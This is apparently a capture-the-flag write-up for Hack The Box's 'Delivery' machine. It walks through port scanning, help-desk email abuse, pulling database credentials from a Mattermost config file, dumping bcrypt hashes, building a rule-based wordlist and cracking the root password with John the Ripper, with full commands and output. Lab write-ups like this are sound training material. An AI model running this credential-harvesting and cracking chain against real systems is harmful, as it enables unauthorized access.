# Delivery Walkthrough

![delivery](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Delivery/delivery.png)

## let's first fast scan our machine with nmap

```console
$ sudo nmap -F -sV 10.10.10.222 

Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-14 14:19 IST 
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan 
Ping Scan Timing: About 100.00% done; ETC: 14:19 (0:00:00 remaining) 
Nmap scan report for 10.10.10.222 
Host is up (0.30s latency). 
Not shown: 98 closed tcp ports (reset) 
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 
80/tcp open  http    nginx 1.14.2 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 16.60 seconds
```

## now let's also do a berif scan using nmap.

```console
$ sudo nmap -A -O -v --script vuln 10.10.10.222
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 
80/tcp open  http    nginx 1.14.2 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities. 
|_http-server-header: nginx/1.14.2 
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug) 
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug) 
|_http-dombased-xss: Couldn't find any DOM based XSS. 
|_http-csrf: Couldn't find any CSRF vulnerabilities. 
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). 
TCP/IP fingerprint: 
OS:SCAN(V=7.92%E=4%D=4/14%OT=22%CT=1%CU=37751%PV=Y%DS=2%DC=I%G=Y%TM=6257E17 
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS 
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1 
OS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN 
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)ECN(R=N)T1(R=Y%DF=Y%T=40%S=O% 
OS:A=S+%F=AS%RD=0%Q=)T1(R=N)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R% 
OS:O=%RD=0%Q=)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T5(R=N)T 
OS:6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=N)T7(R=Y%DF=Y%T=40%W=0%S 
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID= 
OS:G%RIPCK=G%RUCK=G%RUD=G)U1(R=N)IE(R=Y%DFI=N%T=40%CD=S)IE(R=N) 
 
Network Distance: 2 hops 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
 
TRACEROUTE (using port 587/tcp) 
HOP RTT    ADDRESS 
1   ... 30 
 
NSE: Script Post-scanning. 
Initiating NSE at 14:25 
Completed NSE at 14:25, 0.00s elapsed 
Initiating NSE at 14:25 
Completed NSE at 14:25, 0.00s elapsed 
Read data files from: /usr/bin/../share/nmap 
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 286.51 seconds 
           Raw packets sent: 1308 (65.974KB) | Rcvd: 1047 (43.994KB)
 ```
 
 ## we got two port open 22 and 80 , let's first access http port 
 
 ![http](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Delivery/http.png)
 
 ## here we found contact us button i click on it and a pop up window open image given below.
 
 ![popup](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Delivery/popup.png)
 
 ## here we go two page 1. Help Desk and 2. MatterMost server, we need to create email address with @delivery.htb in Help Desk.
 
 ## before doing this let's first help desk subdomain to etc/host file 
 
 ```
10.10.10.222	delivery.htb   helpdesk.delivery.htb
 ```

## then i visit helpdesk.delivery.htb and got another page image given below.

![helpdesk](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Delivery/helpdesk.png)

## then i click on open a new ticket and got a new page

![open](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Delivery/open.png)

## i fill  filed with random value , on email don't forget to add @delivery.htb

![openticket](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Delivery/openticket.png)
 
 ## after click on create ticket redirect to another page that give me id number.
 
 ![id](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Delivery/id.png)
 
 ## then i go to matter most domain we found early got a login page.
 
 ![login](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Delivery/login.png)
 
 ## i click on create new one and enter required field
 
 ![required](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Delivery/required.png)
 
 ## then i redirect to a page that show verfication email send on our email. 
 
 ![verification](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Delivery/verification.png)
 
 ## then i go back to helpdesk domain and click on check ticket status
 
 ![check](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Delivery/check.png)
 
 ## i fill email and email id and click on view ticket.
 
 ![email](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Delivery/email.png)
 
 ## here we found a verfication email come with url i visit this link and got email verfied notification. 
 
 ![verified](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Delivery/verified.png)
 
 ## then i enter my credentials i use before and click on sign in got a page that show team you can join i click on internal and redirect to another page .
 
 ![signin](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Delivery/signin.png)
 
 ## here we got message of root and system, we found password and username in root message and also a information that root hash is not able to crack with pre created wordlist like rockyou.txt
 
 ## then i first use found credentials on ssh and successfully login as maildeliverer user

 ```console
 $ssh maildeliverer@10.10.10.222 
maildeliverer@10.10.10.222's password:  
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 
 
The programs included with the Debian GNU/Linux system are free software; 
the exact distribution terms for each program are described in the 
individual files in /usr/share/doc/*/copyright. 
 
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent 
permitted by applicable law. 
Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5 
maildeliverer@Delivery:~$ ls 
user.txt
 ```
 
 ## then i start enumerating further for priv esc and found a config.json file in /opt/mattermost/config/config.json 
 
 ```console
 maildeliverer@Delivery:/opt/mattermost/config$ ls 
README.md  cloud_defaults.json  config.json
 ```
 
 ## i read this file content using cat and found username and password of mysql
 
![mysql](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Delivery/mysql.png)

## then i use netstat for finding mysql port

```console
maildeliverer@Delivery:/opt/mattermost/config$ netstat -an 
Active Internet connections (servers and established) 
Proto Recv-Q Send-Q Local Address           Foreign Address         State       
tcp        0      0 127.0.0.1:1025          0.0.0.0:*               LISTEN      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      
tcp        0      0 127.0.0.1:3306          127.0.0.1:43876         ESTABLISHED 
tcp        0      0 127.0.0.1:43878         127.0.0.1:3306          ESTABLISHED 
tcp        0      0 127.0.0.1:43874         127.0.0.1:3306          ESTABLISHED 
tcp        0      0 127.0.0.1:43884         127.0.0.1:3306          ESTABLISHED 
tcp        0      0 127.0.0.1:43876         127.0.0.1:3306          ESTABLISHED 
tcp        0      0 127.0.0.1:43882         127.0.0.1:3306          ESTABLISHED 
tcp        0      0 127.0.0.1:43872         127.0.0.1:3306          ESTABLISHED 
tcp        0      0 127.0.0.1:3306          127.0.0.1:43874         ESTABLISHED 
tcp        0      0 127.0.0.1:3306          127.0.0.1:43870         ESTABLISHED 
tcp        0      0 127.0.0.1:43870         127.0.0.1:3306          ESTABLISHED 
tcp        0    208 10.10.10.222:22         10.10.14.10:56694       ESTABLISHED 
tcp        0      0 127.0.0.1:3306          127.0.0.1:43880         ESTABLISHED 
tcp        0      0 127.0.0.1:3306          127.0.0.1:43882         ESTABLISHED 
tcp        0      0 127.0.0.1:3306          127.0.0.1:43884         ESTABLISHED 
tcp        0      0 127.0.0.1:3306          127.0.0.1:43878         ESTABLISHED 
tcp        0      0 127.0.0.1:43880         127.0.0.1:3306          ESTABLISHED 
tcp        0      0 127.0.0.1:3306          127.0.0.1:43872         ESTABLISHED 
tcp6       0      0 :::8065                 :::*                    LISTEN      
tcp6       0      0 :::80                   :::*                    LISTEN      
tcp6       0      0 :::22                   :::*                    LISTEN      
tcp6       0      0 ::1:631                 :::*                    LISTEN      
tcp6       0      0 10.10.10.222:8065       10.10.14.10:46548       TIME_WAIT   
tcp6       0      0 10.10.10.222:8065       10.10.14.10:46492       ESTABLISHED 
tcp6       0      0 10.10.10.222:8065       10.10.14.10:46554       ESTABLISHED 
udp        0      0 0.0.0.0:36128           0.0.0.0:*                           
udp        0      0 10.10.10.222:45600      8.8.8.8:53              ESTABLISHED 
udp        0      0 0.0.0.0:631             0.0.0.0:*                           
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           
udp6       0      0 :::52739                :::*                                
udp6       0      0 :::5353                 :::*                     
```

## and found mysql server is running on 127.0.0.1:3306 i try to login to mysql using found mysql username and password.
 
 ```console
maildeliverer@Delivery:/opt/mattermost/config$ mysql -h 127.0.0.1 -u 'mmuser' -p 
Enter password:  
Welcome to the MariaDB monitor.  Commands end with ; or \g. 
Your MariaDB connection id is 101 
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10 
 
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. 
 
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement. 
 
MariaDB [(none)]>
 ```
 
 ## let's show database and table using below command given below
 
 ```
show databases;
use mattermost;
show tables;
select Username, password from Users;
```

### Terminal Output given below

```console
MariaDB [(none)]> show databases; 
+--------------------+ 
| Database           | 
+--------------------+ 
| information_schema | 
| mattermost         | 
+--------------------+ 
2 rows in set (0.001 sec) 
 
MariaDB [(none)]> use mattermost; 
Reading table information for completion of table and column names 
You can turn off this feature to get a quicker startup with -A 
 
Database changed 
MariaDB [mattermost]> show tables; 
+------------------------+ 
| Tables_in_mattermost   | 
+------------------------+ 
| Audits                 | 
| Bots                   | 
| ChannelMemberHistory   | 
| ChannelMembers         | 
| Channels               | 
| ClusterDiscovery       | 
| CommandWebhooks        | 
| Commands               | 
| Compliances            | 
| Emoji                  | 
| FileInfo               | 
| GroupChannels          | 
| GroupMembers           | 
| GroupTeams             | 
| IncomingWebhooks       | 
| Jobs                   | 
| Licenses               | 
| LinkMetadata           | 
| OAuthAccessData        | 
| OAuthApps              | 
| OAuthAuthData          | 
| OutgoingWebhooks       | 
| PluginKeyValueStore    | 
| Posts                  | 
| Preferences            | 
| ProductNoticeViewState | 
| PublicChannels         | 
| Reactions              | 
| Roles                  | 
| Schemes                | 
| Sessions               | 
| SidebarCategories      | 
| SidebarChannels        | 
| Status                 | 
| Systems                | 
| TeamMembers            | 
| Teams                  | 
| TermsOfService         | 
| ThreadMemberships      | 
| Threads                | 
| Tokens                 | 
| UploadSessions         | 
| UserAccessTokens       | 
| UserGroups             | 
| UserTermsOfService     | 
| Users                  | 
+------------------------+ 
46 rows in set (0.001 sec) 
 
MariaDB [mattermost]> select Username, password from Users; 
+----------------------------------+--------------------------------------------------------------+ 
| Username                         | password                                                     | 
+----------------------------------+--------------------------------------------------------------+ 
| surveybot                        |                                                              | 
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK | 
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G | 
| villan01001                      | $2a$10$YMGReK8l3SwUykvUjY9pl.Tj2KflDXd44VaXBiNsn3htENboTVYoe | 
| villan01001001                   | $2a$10$uyOHFRVhWvdp1EEIE6xPvuLFVSF4JYz3Ki3OBJ6nQSRJv05xjUM/W | 
| neon0                            | $2a$10$J67BzSdhWCfSGL6/bhiflO/TnArhd9PH/wFd1hYwOvKoZXMOfKl06 | 
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | 
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq | 
| channelexport                    |                                                              | 
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm | 
| villan010010                     | $2a$10$os7W7aFHP3PL5WjWVm9cMua3z2DMgte0pzjWZFJbfmy3uQJ/s3F6y | 
+----------------------------------+--------------------------------------------------------------+ 
11 rows in set (0.001 sec) 
 
MariaDB [mattermost]> exit 
Bye
 
```

## we got root hash i copy this hash in my system. now we know this hash not able to crack with simple password list bruteforcing then i create a dictornary using hashcat rules and found word on root message on mattermost server.

![matter](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Delivery/matter.png)

```console
$ cat key  
PleaseSubscribe!

$ hashcat -r /usr/share/hashcat/rules/best64.rule --stdout key > dict.txt

$ cat dict.txt  
PleaseSubscribe! 
!ebircsbuSesaelP 
PLEASESUBSCRIBE! 
pleaseSubscribe! 
PleaseSubscribe!0 
PleaseSubscribe!1 
PleaseSubscribe!2 
PleaseSubscribe!3 
PleaseSubscribe!4 
PleaseSubscribe!5 
PleaseSubscribe!6 
PleaseSubscribe!7 
PleaseSubscribe!8 
PleaseSubscribe!9 
PleaseSubscribe!00 
PleaseSubscribe!01 
PleaseSubscribe!02 
PleaseSubscribe!11 
PleaseSubscribe!12 
PleaseSubscribe!13 
PleaseSubscribe!21 
PleaseSubscribe!22 
PleaseSubscribe!23 
PleaseSubscribe!69 
PleaseSubscribe!77 
PleaseSubscribe!88 
PleaseSubscribe!99 
PleaseSubscribe!123 
PleaseSubscribe!e 
PleaseSubscribe!s 
PleaseSubscribea 
PleaseSubscribs 
PleaseSubscriba 
PleaseSubscriber 
PleaseSubscribie 
PleaseSubscrio 
PleaseSubscriy 
PleaseSubscri123 
PleaseSubscriman 
PleaseSubscridog 
1PleaseSubscribe! 
thePleaseSubscribe! 
dleaseSubscribe! 
maeaseSubscribe! 
PleaseSubscribe! 
PleaseSubscr1be! 
Pl3as3Subscrib3! 
PlaseSubscribe! 
PlseSubscribe! 
PleseSubscribe! 
PleaeSubscribe! 
Ples 
Pleas1 
PleaseSubscribe 
PleaseSubscrib 
PleaseSubscri 
PleaseSubscriPleaseSubscri 
PeaseSubscri 
ribe 
bscribe!easeSu 
PleaseSubscri! 
dleaseSubscrib 
be!PleaseSubscri 
ibe! 
ribe! 
cribcrib 
tlea 
asPasP 
XleaseSubscribe! 
SaseSubscribe! 
PleaSu 
PlesPles 
asP 
PlcrPlcr 
PcSu 
PleasS 
PeSubs
```

## i create a file name key and save the root word then i use hashcat rule for creating wordlist. now let's crack it using john the ripper.

```console
$ john --wordlist=dict.txt hash  
Using default input encoding: UTF-8 
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) 
Cost 1 (iteration count) is 1024 for all loaded hashes 
Will run 8 OpenMP threads 
Press 'q' or Ctrl-C to abort, almost any other key for status 
PleaseSubscribe!21 (?) 
1g 0:00:00:00 DONE (2022-04-14 15:26) 2.631g/s 189.4p/s 189.4c/s 189.4C/s PleaseSubscribe!..PlesPles 
Use the "--show" option to display all of the cracked passwords reliably 
Session completed
```

## we got password then i simplly do su root and use this password and got root shell.

```console
maildeliverer@Delivery:/opt/mattermost/config$ su root 
Password:  
root@Delivery:/opt/mattermost/config# cat /root 
cat: /root: Is a directory 
root@Delivery:/opt/mattermost/config# cd /root 
root@Delivery:~# ls 
mail.sh  note.txt  py-smtp.py  root.txt
```

# BOOOOMMM!! WE SUCCESSFULLY SOLVED THE MACHINE

![funny](https://c.tenor.com/bCyAz0gB9hMAAAAC/dance-vadivelu.gif)
